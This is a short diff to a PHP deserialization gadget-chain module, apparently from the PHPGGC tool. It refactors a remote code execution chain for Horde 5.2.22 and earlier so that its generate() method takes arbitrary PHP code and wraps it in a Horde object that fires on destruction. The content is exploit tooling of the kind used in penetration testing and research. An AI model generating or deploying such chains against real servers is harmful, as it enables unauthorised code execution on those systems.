@@ -2,7 +2,7 @@
 
 namespace GadgetChain\Horde;
 
-class RCE1 extends \PHPGGC\GadgetChain\RCE
+class RCE1 extends \PHPGGC\GadgetChain\RCE\PHPCode
 {
     public static $version = '<= 5.2.22';
     public static $vector = '__destruct';
@@ -15,7 +15,7 @@ class RCE1 extends \PHPGGC\GadgetChain\RCE
 
     public function generate(array $parameters)
     {
-	    $code = $parameters['function']."(".$parameters['parameter'].");die;";
+	    $code = $parameters['code'] . ';die;';
         return new \Horde_Kolab_Server_Decorator_Clean($code);
     }
 }
